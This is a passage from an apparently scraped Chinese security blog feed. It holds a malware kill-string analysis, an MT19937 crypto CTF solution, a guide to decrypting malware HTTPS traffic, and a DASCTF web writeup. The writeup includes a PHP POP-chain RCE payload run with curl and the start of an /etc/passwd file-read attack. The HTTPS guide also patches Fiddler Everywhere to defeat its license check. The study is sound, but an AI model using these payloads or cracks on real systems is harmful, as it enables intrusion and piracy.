&#x27;29&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;11&#x27;, &#x27;4&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;10&#x27;, &#x27;11&#x27;, &#x27;15&#x27;, &#x27;16&#x27;, &#x27;14&#x27;, &#x27;11&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;16&#x27;, &#x27;14&#x27;, &#x27;9&#x27;, &#x27;19&#x27;, &#x27;23&#x27;, &#x27;14&#x27;, &#x27;19&#x27;, &#x27;23&#x27;, &#x27;15&#x27;, &#x27;8&#x27;, &#x27;11&#x27;, &#x27;9&#x27;, &#x27;6&#x27;, &#x27;5&#x27;, &#x27;10&#x27;, &#x27;15&#x27;, &#x27;10&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;7&#x27;, &#x27;3&#x27;, &#x27;18&#x27;, &#x27;23&#x27;, &#x27;9&#x27;, &#x27;16&#x27;]def func1(): msg_str = &quot;&quot; for _ in cipher1: char = chr(_ ^ 34) if char == &quot;\\0&quot;: msg_str = msg_str + &quot;0&quot; else: msg_str = msg_str + char length = len(list1) for _ in range(length): print(msg_str[int(list1[_]):int(list1[_])+int(list2[_])])if __name__ == &quot;__main__&quot;: func1() 这样就得到了表格每项的数据，再把源码的表格解密一下，两边的数据顺序大致上是对得上的 多余的部分基本上就是字符串KILL特征了，特征如下 12345678910111213141516171819202122232425262728dvrHelper\\x00NiGGeR69xd\\x001337SoraLOADER\\x00NiGGeRd0nks1337\\x00X19I239124UIU\\x00IuYgujeIqn\\x0014Fa\\x00ccAD\\x00&#x2F;proc&#x2F;net&#x2F;route\\x00&#x2F;proc&#x2F;cpuinfo\\x00BOGOMIPS\\x00&#x2F;etc&#x2F;rc.d&#x2F;rc.local\\x00g1abc4dmo35hnp2lie0kjf\\x00&#x2F;dev&#x2F;watchdog\\x00&#x2F;dev&#x2F;misc&#x2F;watchdog\\x00&#x2F;dev&#x2F;FTWDT101_watchdog\\x00&#x2F;dev&#x2F;netslink&#x2F;\\x00PRIVMSG\\x00GETLOCALIP\\x00KILLATTK\\x00Eats8\\x00v[0v\\x0093OfjHZ2z\\x00GhostWuzHere666WsGA4@F6F\\x00ACDB\\x00AbAd\\x00iaGv\\x00 BTW：若出现\\x00则为必要的，C语言程序中输出&quot;KEY{dvrHelper}&quot;不会触发KILL机制，输出&quot;dvrHelper&quot;则会 但是还是要验证一下 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void main()&#123; FILE *fp; char *res; system(&quot;xxd ./kill_me | grep dvr -A 1&quot;); printf(&quot;\\n&quot;); printf(&quot;Kill_me_KEY is :dvrHelper&quot;); while(1) &#123; printf(&quot;\\n&quot;); printf(&quot;I&#x27;m alive at &quot;); fp = popen(&quot;date&quot;, &quot;r&quot;); while(fgets(res, sizeof(res), fp) != NULL) &#123; printf(&quot;%s&quot;, res); &#125; pclose(fp); sleep(10); &#125;&#125; 照这样每个字符串都过一遍 可以确定上文部分的特征都为字符串KILL特征 KEY_in_HIDS 12345678910111213141516171819202122232425262728293031323334353637383940import binasciiimport rekey = [&quot;dvrHelper&quot;, &quot;NiGGeR69xd&quot;, &quot;1337SoraLOADER&quot;, &quot;NiGGeRd0nks1337&quot;, &quot;X19I239124UIU&quot;, &quot;IuYgujeIqn&quot;, &quot;14Fa&quot;, &quot;ccAD&quot;, &quot;/proc/net/route&quot;, &quot;/proc/cpuinfo&quot;, &quot;BOGOMIPS&quot;, &quot;/etc/rc.d/rc.local&quot;, &quot;g1abc4dmo35hnp2lie0kjf&quot;, &quot;/dev/watchdog&quot;, &quot;/dev/misc/watchdog&quot;, &quot;/dev/FTWDT101_watchdog&quot;, &quot;/dev/netslink/&quot;, &quot;PRIVMSG&quot;, &quot;GETLOCALIP&quot;, &quot;KILLATTK&quot;, &quot;Eats8&quot;, &quot;v[0v&quot;, &quot;93OfjHZ2z&quot;, &quot;GhostWuzHere666&quot;, &quot;WsGA4@F6F&quot;, &quot;ACDB&quot;, &quot;AbAd&quot;, &quot;iaGv&quot;]f = open(&quot;/usr/local/[DATA_EXPUNGED]&quot;, &quot;rb&quot;)data = f.read()f.close()data = binascii.hexlify(data).decode()for _ in key: hex_key = binascii.hexlify(_.encode()).decode() find_list = re.findall(hex_key, data) if find_list != []: print(_) 写份报告就能交差了","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"},{"name":"Malware","slug":"Malware","permalink":"https://yoloyolo.top/tags/Malware/"}]},{"title":"DASCTF_MAY_2022","slug":"DASCTF-MAY-2022","date":"2022-05-22T02:11:59.000Z","updated":"2022-06-27T18:30:18.000Z","comments":true,"path":"2022/05/21/DASCTF-MAY-2022/","link":"","permalink":"https://yoloyolo.top/2022/05/21/DASCTF-MAY-2022/","excerpt":"老样子，赛后解题","text":"老样子，赛后解题 Yusa的密码学课堂——一见如故 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Myrand(): def __init__(self,seed): self.index = 0 self.isInit = 1 self.MT = [seed] + [0] * 623 for i in range(1,624): t = 1314433253 * (self.MT[i-1] ^ (self.MT[i-1] &gt;&gt; 30)) + 1 self.MT[i] = t &amp; 0xffffffff def generate(self): for i in range(624): y = (self.MT[i] &amp; 0x80000000) + (self.MT[(i+1)%624] &amp; 0x7fffffff) self.MT[i] = self.MT[(i+397)%624] ^ (y &gt;&gt; 1) if y &amp; 1: self.MT[i] ^= 2567483520 def rand(self): if self.index == 0: self.generate() y = self.MT[self.index] y = y ^ self.cs2l(y, 11) ^ self.cs2l(y, 15) y = y ^ self.cs2r(y, 7) ^ self.cs2r(y, 19) self.index = (self.index + 1) % 624 return y def cs2l(self, y, shift): return ((y &lt;&lt; shift) ^ (y &gt;&gt; (32 - shift))) &amp; 0xffffffff def cs2r(self, y, shift): return ((y &gt;&gt; shift) ^ (y &lt;&lt; (32 - shift))) &amp; 0xffffffffimport osr = Myrand(int(os.urandom(4).hex(),16))out = []for i in range(624): out.append(r.rand())with open(&quot;output.txt&quot;,&quot;w&quot;) as f: f.write(str(out))from hashlib import md5flag = &#x27;DASCTF&#123;&#x27; + md5(str(r.rand()).encode()).hexdigest() + &#x27;&#125;&#x27;print(flag) 函数__init__(self,seed)用于初始化 函数rand(self)为主要函数 函数generate(self)用于当index为0时重新生成列表MT 函数cs2l(self, y, shift)用于将y按bit循环左移shift位 函数cs2r(self, y, shift)用于将y按bit循环右移shift位 由于是先生成了624个随机数，即遍历了一遍列表MT，再生成了flag 所以我们用给出的624个随机数逆推出列表MT的状态，再调用一下函数generate(self)，最后在生成一个随机数即可获得flag 此题的难点在于这两条语句的逆算法 12y = y ^ self.cs2l(y, 11) ^ self.cs2l(y, 15)y = y ^ self.cs2r(y, 7) ^ self.cs2r(y, 19) 先看第一条语句，产生的结果等价如下方程组 {a0=b0⊕b11⊕b15a1=b1⊕b12⊕b16a2=b2⊕b13⊕b17a3=b3⊕b14⊕b18a4=b4⊕b15⊕b19a5=b5⊕b16⊕b20a6=b6⊕b17⊕b21a7=b7⊕b18⊕b22a8=b8⊕b19⊕b23a9=b9⊕b20⊕b24a10=b10⊕b21⊕b25a11=b11⊕b22⊕b26a12=b12⊕b23⊕b27a13=b13⊕b24⊕b28a14=b14⊕b25⊕b29a15=b15⊕b26⊕b30a16=b16⊕b27⊕b31a17=b17⊕b28⊕b0a18=b18⊕b29⊕b1a19=b19⊕b30⊕b2a20=b20⊕b31⊕b3a21=b21⊕b0⊕b4a22=b22⊕b1⊕b5a23=b23⊕b2⊕b6a24=b24⊕b3⊕b7a25=b25⊕b4⊕b8a26=b26⊕b5⊕b9a27=b27⊕b6⊕b10a28=b28⊕b7⊕b11a29=b29⊕b8⊕b12a30=b30⊕b9⊕b13a31=b31⊕b10⊕b14\\begin{cases} a_{0} = b_{0} \\oplus b_{11} \\oplus b_{15} \\\\ a_{1} = b_{1} \\oplus b_{12} \\oplus b_{16} \\\\ a_{2} = b_{2} \\oplus b_{13} \\oplus b_{17} \\\\ a_{3} = b_{3} \\oplus b_{14} \\oplus b_{18} \\\\ a_{4} = b_{4} \\oplus b_{15} \\oplus b_{19} \\\\ a_{5} = b_{5} \\oplus b_{16} \\oplus b_{20} \\\\ a_{6} = b_{6} \\oplus b_{17} \\oplus b_{21} \\\\ a_{7} = b_{7} \\oplus b_{18} \\oplus b_{22} \\\\ a_{8} = b_{8} \\oplus b_{19} \\oplus b_{23} \\\\ a_{9} = b_{9} \\oplus b_{20} \\oplus b_{24} \\\\ a_{10} = b_{10} \\oplus b_{21} \\oplus b_{25} \\\\ a_{11} = b_{11} \\oplus b_{22} \\oplus b_{26} \\\\ a_{12} = b_{12} \\oplus b_{23} \\oplus b_{27} \\\\ a_{13} = b_{13} \\oplus b_{24} \\oplus b_{28} \\\\ a_{14} = b_{14} \\oplus b_{25} \\oplus b_{29} \\\\ a_{15} = b_{15} \\oplus b_{26} \\oplus b_{30} \\\\ a_{16} = b_{16} \\oplus b_{27} \\oplus b_{31} \\\\ a_{17} = b_{17} \\oplus b_{28} \\oplus b_{0} \\\\ a_{18} = b_{18} \\oplus b_{29} \\oplus b_{1} \\\\ a_{19} = b_{19} \\oplus b_{30} \\oplus b_{2} \\\\ a_{20} = b_{20} \\oplus b_{31} \\oplus b_{3} \\\\ a_{21} = b_{21} \\oplus b_{0} \\oplus b_{4} \\\\ a_{22} = b_{22} \\oplus b_{1} \\oplus b_{5} \\\\ a_{23} = b_{23} \\oplus b_{2} \\oplus b_{6} \\\\ a_{24} = b_{24} \\oplus b_{3} \\oplus b_{7} \\\\ a_{25} = b_{25} \\oplus b_{4} \\oplus b_{8} \\\\ a_{26} = b_{26} \\oplus b_{5} \\oplus b_{9} \\\\ a_{27} = b_{27} \\oplus b_{6} \\oplus b_{10} \\\\ a_{28} = b_{28} \\oplus b_{7} \\oplus b_{11} \\\\ a_{29} = b_{29} \\oplus b_{8} \\oplus b_{12} \\\\ a_{30} = b_{30} \\oplus b_{9} \\oplus b_{13} \\\\ a_{31} = b_{31} \\oplus b_{10} \\oplus b_{14} \\end{cases}⎩⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎨⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎪⎧​a0​=b0​⊕b11​⊕b15​a1​=b1​⊕b12​⊕b16​a2​=b2​⊕b13​⊕b17​a3​=b3​⊕b14​⊕b18​a4​=b4​⊕b15​⊕b19​a5​=b5​⊕b16​⊕b20​a6​=b6​⊕b17​⊕b21​a7​=b7​⊕b18​⊕b22​a8​=b8​⊕b19​⊕b23​a9​=b9​⊕b20​⊕b24​a10​=b10​⊕b21​⊕b25​a11​=b11​⊕b22​⊕b26​a12​=b12​⊕b23​⊕b27​a13​=b13​⊕b24​⊕b28​a14​=b14​⊕b25​⊕b29​a15​=b15​⊕b26​⊕b30​a16​=b16​⊕b27​⊕b31​a17​=b17​⊕b28​⊕b0​a18​=b18​⊕b29​⊕b1​a19​=b19​⊕b30​⊕b2​a20​=b20​⊕b31​⊕b3​a21​=b21​⊕b0​⊕b4​a22​=b22​⊕b1​⊕b5​a23​=b23​⊕b2​⊕b6​a24​=b24​⊕b3​⊕b7​a25​=b25​⊕b4​⊕b8​a26​=b26​⊕b5​⊕b9​a27​=b27​⊕b6​⊕b10​a28​=b28​⊕b7​⊕b11​a29​=b29​⊕b8​⊕b12​a30​=b30​⊕b9​⊕b13​a31​=b31​⊕b10​⊕b14​​ 其中aaa，bbb代表32位bit 已知aaa，求bbb 使a0=a0⊕a11⊕a15a_{0} = a_{0} \\oplus a_{11} \\oplus a_{15}a0​=a0​⊕a11​⊕a15​，余下的式子模32递增下标 可得 a0=b0⊕b22⊕b30a_{0} = b_{0} \\oplus b_{22} \\oplus b_{30}a0​=b0​⊕b22​⊕b30​ ......... 重复上述操作得到 a0=b0⊕b12⊕b18a_{0} = b_{0} \\oplus b_{12} \\oplus b_{18}a0​=b0​⊕b12​⊕b18​ 于是我猜想可能在进行足够多次的迭代运算后得到的结果是 a0=b0⊕b0⊕b0a_{0} = b_{0} \\oplus b_{0} \\oplus b_{0}a0​=b0​⊕b0​⊕b0​ 即a0=b0a_{0} = b_{0}a0​=b0​ 编写脚本验证想法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162equ = [[0, 11, 15],[1, 12, 16],[2, 13, 17],[3, 14, 18],[4, 15, 19],[5, 16, 20],[6, 17, 21],[7, 18, 22],[8, 19, 23],[9, 20, 24],[10, 21, 25],[11, 22, 26],[12, 23, 27],[13, 24, 28],[14, 25, 29],[15, 26, 30],[16, 27, 31],[17, 28, 0],[18, 29, 1],[19, 30, 2],[20, 31, 3],[21, 0, 4],[22, 1, 5],[23, 2, 6],[24, 3, 7],[25, 4, 8],[26, 5, 9],[27, 6, 10],[28, 7, 11],[29, 8, 12],[30, 9, 13],[31, 10, 14]]import copydef self_xor(number1, number2): new_equ = [] length = len(equ) for _ in range(length): equ1 = [x for x in equ[_]] equ2 = [x for x in equ[(_ + number1)%length]] equ3 = [x for x in equ[(_ + number2)%length]] for __ in equ2: if __ in equ1: equ1.pop(equ1.index(__)) else: equ1.append(__) for __ in equ3: if __ in equ1: equ1.pop(equ1.index(__)) else: equ1.append(__) new_equ.append(equ1) return new_equequ = self_xor(25, 13)equ = self_xor(18, 26)equ = self_xor(4, 20)for _ in equ: print(_) 最后的输出结果可以验证想法正确，且获得了迭代异或运算的shitf值 第二条语句的逆向算法同理 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253def bits_xor(bits, shift1, shift2): old_bits = bits length = len(bits) new_bits = &quot;&quot; for _ in range(length): new_bits = new_bits + str(int(old_bits[_]) ^ int(old_bits[(_+shift1)%length]) ^ int(old_bits[(_+shift2)%length])) return new_bitsdef cs2l(y, shift): return ((y &lt;&lt; shift) ^ (y &gt;&gt; (32 - shift))) &amp; 0xffffffff def cs2r(y, shift): return ((y &gt;&gt; shift) ^ (y &lt;&lt; (32 - shift))) &amp; 0xffffffffdef reverse_cs2l(y): bits = bin(y)[2:] bit_len = len(bits) bits32 = &quot;0&quot; * (32 - bit_len) + bits bits32 = bits_xor(bits32, 11, 15) bits32 = bits_xor(bits32, 22, 30) bits32 = bits_xor(bits32, 12, 28) number = int(bits32, 2) return numberdef reverse_cs2r(y): bits = bin(y)[2:] bit_len = len(bits) bits32 = &quot;0&quot; * (32 - bit_len) + bits bits32 = bits_xor(bits32, 25, 13) bits32 = bits_xor(bits32, 18, 26) bits32 = bits_xor(bits32, 4, 20) number = int(bits32, 2) return numberf = open(&quot;./output.txt&quot;, &quot;r&quot;)data = f.read().split(&quot;, &quot;)f.close()MT = []for _ in data: MT.append(reverse_cs2l(reverse_cs2r(int(_))))for i in range(624): y = (MT[i] &amp; 0x80000000) + (MT[(i+1)%624] &amp; 0x7fffffff) MT[i] = MT[(i+397)%624] ^ (y &gt;&gt; 1) if y &amp; 1: MT[i] ^= 2567483520y = MT[0]y = y ^ cs2l(y, 11) ^ cs2l(y, 15)y = y ^ cs2r(y, 7) ^ cs2r(y, 19)from hashlib import md5flag = &#x27;DASCTF&#123;&#x27; + md5(str(y).encode()).hexdigest() + &#x27;&#125;&#x27;print(flag) 1DASCTF&#123;49e225e5b1b57a1d3c9803b5ddfd38f9&#125; 后面两题随缘更新 更个锤子，Crypto2 3想破头都没思路","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"MT19937","slug":"MT19937","permalink":"https://yoloyolo.top/tags/MT19937/"}]},{"title":"恶意程序HTTPS解密","slug":"Malware-HTTPS-Decryption","date":"2022-05-14T23:54:29.000Z","updated":"2022-06-10T17:44:30.000Z","comments":true,"path":"2022/05/14/Malware-HTTPS-Decryption/","link":"","permalink":"https://yoloyolo.top/2022/05/14/Malware-HTTPS-Decryption/","excerpt":"距离省考宣布寄了已经过去了两个月了 于是打了两个月的游戏，属实是打吐了 出来去原来的单位实习 上来就是分析病毒 在摸索的过程中产生了这篇文章","text":"距离省考宣布寄了已经过去了两个月了 于是打了两个月的游戏，属实是打吐了 出来去原来的单位实习 上来就是分析病毒 在摸索的过程中产生了这篇文章 0x00 Wireshark 尝试抓包恶意软件 开启Wireshark，运行恶意程序，全是HTTPS的数据 看了下网上的资料可以设置环境变量$SSLKEYLOGFILE来设置SSL密钥临时文件的位置，然后在Wireshark里导入 1export SSLKEYLOGFILE=/tmp/tls.log Edit→ Preferences → Protocols → TLS → (Pre-)Master-Secret log filename 选择环境变量$SSLKEYLOGFILE的内容 1curl https://www.baidu.com/ 即可$SSLKEYLOGFILE中看到HTTPS的密钥 Wireshark中也可以看到解密的HTTPS流量 但是运行恶意程序，恶意程序发起的HTTPS请求后并不会在$SSLKEYLOGFILE写入密钥 所以这个方法行不通 有想到过自己看TLS的密钥协商过程，写个脚本来计算出Master Secret Key，然后导入Wireshark来解密已保存的流量，但水平有限写不出来 好吧，正常情况 0x01 Burpsuite 将Burpsuite证书设置为系统证书（与这篇文章类似） 12345burpsuite&amp;curl -O http://127.0.0.1:8080/certopenssl x509 -inform DER -in cert -out burp.crtmv burp.crt /usr/local/share/ca-certificates/update-ca-certificates 设置系统代理 12export http_proxy=&quot;http://127.0.0.1:8080/&quot;export https_proxy=&quot;http://127.0.0.1:8080/&quot; 命令行里的curl和python都能被抓到https的数据包 但是恶意软件的流量抓不到 使用proxychains代理 123apt-get install proxychainsecho &quot;http 127.0.0.1 8080&quot; &gt;&gt; /etc/proxychains.confproxychain ./fritzfrog (配置文件/etc/proxychains.conf好像默认有一个socks4的代理？自己看着删掉吧) 但是恶意软件的流量还是抓不到 大概是这个恶意程序设置的是不走系统的代理吧，只能说开发人员有点水平 0x02 Fiddler Everywhere 想着在Fiddler上抓一下全局流量，结果Fiddler4在linux上面用不了，只能用mono运行一个老版本 还是用Fidder Everywhere吧 123wget https://downloads.getfiddler.com/linux/fiddler-everywhere-3.2.0.AppImagechmod +x fiddler-everywhere-3.2.0.AppImage./fiddler-everywhere-3.2.0.AppImage 注册，登录，“Your 30-day free trial has expired!” 看来是得破解一下了 AppImage格式操作说明 网上逛逛找到了个补丁 补丁下载 1fiddler-everywhere-3.2.0.AppImage --appimage-extract Fiddler.WebUi.dll在./squashfs-root/resources/app/out/WebServer/ main.3f983221e4e1aade.js在./squashfs-root/resources/app/out/WebServer/ClientApp/dist/ 替换完成后进行打包 123456wget https://github.com/AppImage/AppImageKit/releases/download/13/appimagetool-x86_64.AppImagemv appimagetool-x86_64.AppImage appimagetoolchmod +x appiamgetoolmv appimagetool /usr/local/bin/ARCH=x86_64 appimagetool squashfs-root/./Fiddler_Everywhere-x86_64.AppImage 卡在&quot;Please Wait&quot;界面，寄 根据这篇博客[Linux]破解抓包软件FiddlerEverywhere 3.2.0 cracked用dnspy改FiddlerBackendSDK.dll文件 123456789101112131415//rawpublic AccountDTO GetBestAccount(UserWithBestAccountDTO user)&#123; if (user.BestEverywhereAccountId != null) &#123; return Enumerable.FirstOrDefault&lt;UserAccountDTO&gt;(user.Accounts, (UserAccountDTO x) =&gt; x.Id == user.BestEverywhereAccountId.Value); &#125; return null;&#125;//modifiedpublic AccountDTO GetBestAccount(UserWithBestAccountDTO user)&#123; return Enumerable.FirstOrDefault&lt;UserAccountDTO&gt;(user.Accounts, (UserAccountDTO x) =&gt; true);&#125; 改成这样重打包dll，替换原dll后重打包appimage 运行后还是卡在&quot;Please Wait&quot;界面，寄 浪费了大半天的时间混了大半天 0x03 Polarproxy 之前想着恶意程序既然能够绕过系统代理，那我把网卡的流量用iptables整个重定向到Burpsuite不就行了 但是实际上还是不行，自己大概思考了一下，这玩意估计把TCP握手的流量也丢给Burpsuite了，Burpsuite估计是处理不了TCP流量，然后就寄了（未验证） 混了大半天，突然脑子有个想法，google上搜了一下&quot;how to decrypt malware https traffic&quot; 然后第一个结果就介绍了PolarProxy这个工具，去官网看了一下 1PolarProxy is a transparent SSL&#x2F;TLS proxy created for incident responders and malware researchers. PolarProxy is primarily designed to intercept and decrypt TLS encrypted traffic from malware. PolarProxy decrypts and re-encrypts TLS traffic, while also saving the decrypted traffic in a PCAP file that can be loaded into Wireshark or an intrusion detection system (IDS). 看来自己是找对东西了 这玩意得单独用个用户运行，不然到时候iptables重定向会跟这玩意整个死循环出来 安装并启用 123456789101112sudo adduser --system --shell /bin/bash proxyusersudo mkdir /var/log/PolarProxysudo chown proxyuser:root /var/log/PolarProxy/sudo chmod 0775 /var/log/PolarProxy/sudo su - proxyusermkdir ~/PolarProxycd ~/PolarProxy/curl https://www.netresec.com/?download=PolarProxy | tar -xzf -exitsudo cp /home/proxyuser/PolarProxy/PolarProxy.service /etc/systemd/system/PolarProxy.servicesudo systemctl enable PolarProxy.servicesudo systemctl start PolarProxy.service 配置系统证书 123sudo mkdir /usr/share/ca-certificates/extrasudo openssl x509 -inform DER -in /var/log/PolarProxy/polarproxy.cer -out /usr/share/ca-certificates/extra/PolarProxy-root-CA.crtsudo dpkg-reconfigure ca-certificates 启用extra /PolarProxy-root-CA.crt即可 配置iptables 12iptables -t nat -A OUTPUT -m owner --uid 0 -p tcp --dport 443 -j REDIRECT --to 10443iptables -t nat -A OUTPUT -m owner --uid 1000 -p tcp --dport 443 -j REDIRECT --to 10443 运行恶意程序后在目录/var/log/PolarProxy/中可以看到程序捕获并解密的HTTPS流量 使用wireshark打开即可 普通用户运行恶意程序没啥反应，用root运行才抓到包 顺带一提，这个程序默认每天解密10GB的HTTPS的流量或10000次SESSION，但是够用了 0x04 ecapture https://github.com/ehids/ecapture 看ebpf rootkit的时候看到了一个基于ebpf的monitor 能检测bash和解密https 解密的大概思路是hook一些ssl库，对于tls层可以直接获取http请求与响应 也就意味着这玩意甚至能免除用于MITM的CA 但是缺点也很明显 12ldd .&#x2F;apache2 not a dynamic executable","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://yoloyolo.top/tags/HTTPS/"},{"name":"Traffic_Analysis","slug":"Traffic-Analysis","permalink":"https://yoloyolo.top/tags/Traffic-Analysis/"},{"name":"Malware","slug":"Malware","permalink":"https://yoloyolo.top/tags/Malware/"}]},{"title":"DASCTF_APR_2022","slug":"DASCTF-APR-2022","date":"2022-04-24T05:52:50.000Z","updated":"2022-04-25T08:01:35.000Z","comments":true,"path":"2022/04/24/DASCTF-APR-2022/","link":"","permalink":"https://yoloyolo.top/2022/04/24/DASCTF-APR-2022/","excerpt":"本来恰完KFC晚餐准备回寝室打游戏来着，路上被队友喊去做WEB了 说是今天BUUOJ上的比赛，但是已经打完了，做两题玩玩 但是我上一次碰CTF还是去年的省赛…","text":"本来恰完KFC晚餐准备回寝室打游戏来着，路上被队友喊去做WEB了 说是今天BUUOJ上的比赛，但是已经打完了，做两题玩玩 但是我上一次碰CTF还是去年的省赛… warmup-php 123456789101112131415161718192021&lt;?phpspl_autoload_register(function($class)&#123; require(&quot;./class/&quot;.$class.&quot;.php&quot;);&#125;);highlight_file(__FILE__);error_reporting(0);$action = $_GET[&#x27;action&#x27;];$properties = $_POST[&#x27;properties&#x27;];class Action&#123; public function __construct($action,$properties)&#123; $object=new $action(); foreach($properties as $name=&gt;$value) $object-&gt;$name=$value; $object-&gt;run(); &#125;&#125;new Action($action,$properties);?&gt; 参数action用于输入类名 参数properties用于输入对象的属性 完事后会执行$object-&gt;run() 函数run()在ListView.php中 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpabstract class ListView extends Base&#123; public $tagName=&#x27;div&#x27;; public $template; public function run() &#123; echo &quot;&lt;&quot;.$this-&gt;tagName.&quot;&gt;\\n&quot;; $this-&gt;renderContent(); echo &quot;&lt;&quot;.$this-&gt;tagName.&quot;&gt;\\n&quot;; &#125; public function renderContent() &#123; ob_start(); echo preg_replace_callback(&quot;/&#123;(\\w+)&#125;/&quot;,array($this,&#x27;renderSection&#x27;),$this-&gt;template); ob_end_flush(); &#125; protected function renderSection($matches) &#123; $method=&#x27;render&#x27;.$matches[1]; if(method_exists($this,$method)) &#123; $this-&gt;$method(); $html=ob_get_contents(); ob_clean(); return $html; &#125; else return $matches[0]; &#125;&#125; run() -&gt; renderContent() -&gt; renderSection() 其中函数renderSection()为函数renderContent()中正则匹配替换的回调函数 用于匹配&#123;\\w+&#125;的字符串，并将\\w+拼接到&quot;render&quot;之后，再检验类中是否有这个函数，如果有则执行，没有则输出&#123;\\w+&#125; 再看TestView.php的内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public function renderTableRow($row)&#123; $htmlOptions=array(); if($this-&gt;rowHtmlOptionsExpression!==null) &#123; $data=$this-&gt;data[$row]; $options=$this-&gt;evaluateExpression($this-&gt;rowHtmlOptionsExpression,array(&#x27;row&#x27;=&gt;$row,&#x27;data&#x27;=&gt;$data)); if(is_array($options)) $htmlOptions = $options; &#125; if($this-&gt;rowCssClassExpression!==null) &#123; $data=$this-&gt;dataProvider-&gt;data[$row]; $class=$this-&gt;evaluateExpression($this-&gt;rowCssClassExpression,array(&#x27;row&#x27;=&gt;$row,&#x27;data&#x27;=&gt;$data)); &#125; elseif(is_array($this-&gt;rowCssClass) &amp;&amp; ($n=count($this-&gt;rowCssClass))&gt;0) $class=$this-&gt;rowCssClass[$row%$n]; if(!empty($class)) &#123; if(isset($htmlOptions[&#x27;class&#x27;])) $htmlOptions[&#x27;class&#x27;].=&#x27; &#x27;.$class; else $htmlOptions[&#x27;class&#x27;]=$class; &#125;&#125;public function renderTableBody()&#123; $data=$this-&gt;data; $n=count($data); echo &quot;&lt;hr /&gt;&quot;.$n.&quot;&lt;hr /&gt;&quot;; echo &quot;&lt;tbody&gt;\\n&quot;; if($n&gt;0) &#123; for($row=0;$row&lt;$n;++$row) $this-&gt;renderTableRow($row); &#125; else &#123; echo &#x27;&lt;tr&gt;&lt;td colspan=&quot;&#x27;.count($this-&gt;columns).&#x27;&quot; class=&quot;empty&quot;&gt;&#x27;; echo &quot;&lt;/td&gt;&lt;/tr&gt;\\n&quot;; &#125; echo &quot;&lt;/tbody&gt;\\n&quot;;&#125; renderTableBody() -&gt; renderTableRow() -&gt; evaluateExpression() 函数evaluateExpression()在Base.php中 1234567891011121314public function evaluateExpression($_expression_,$_data_=array())&#123; echo $_expression_.&quot; &quot;.var_dump($_data_).&quot;&lt;hr /&gt;&quot;; if(is_string($_expression_)) &#123; extract($_data_); return eval(&#x27;return &#x27;.$_expression_.&#x27;;&#x27;); &#125; else &#123; $_data_[]=$this; return call_user_func_array($_expression_, $_data_); &#125;&#125; 可以看到最终目的是调用函数中evaluateExpression()的函数eval()以造成RCE 那么可以构造出一个POP链 $template = &quot;&#123;TableBody&#125;&quot; 经过POP链run() -&gt; renderContent() -&gt; renderSection()后 到达函数renderTableBody() 这里有count($data)，然后进行迭代运行函数renderTableRow() 所以需要 $data = 1 到达函数renderTableRow()后，有两条路可以进入函数evaluateExpression() 这里我走的是第一条路，只需要把rowHtmlOptionsExpression设置为不为NULL即可 进入函数evaluateExpression()后就会直接eval($rowHtmlOptionsExpression) 所以放命令即可 $rowHtmlOptionsExpression = &quot;system(\\&quot;/readflag\\&quot;)&quot; 回到开头的两个参数，代入上述参数即可获得flag 12curl http://aa876c17-0ddb-43f7-978e-1ca06b58fe7e.node4.buuoj.cn:81/?action=TestView --data &#x27;properties[template]=&#123;TableBody&#125;&amp;properties[data]=0&amp;properties[rowHtmlOptionsExpression]=system(&quot;/readflag&quot;)&#x27; | grep flagflag&#123;e2fec3cf-a368-45da-9277-2f21aa384a78&#125; 队友本来RCE成功了，hackerbar把phpinfo挡住了，以为没RCE出来… soeasy_php 给的附件是个dockerfile，没啥用感觉 进来就是个上传点，但是我上传了个php后给我的上传路径后缀是png我就觉得不对了 F12查看源码可以看到还有个编辑头像功能 尝试将头像换为其他文件 1234567891011121314151617181920212223curl http://45632cf4-8a41-4ab2-bf06-65db1ccc6307.node4.buuoj.cn:81/edit.php --data &#x27;png=/etc/passwd&amp;flag=&#x27;成功更换头像curl 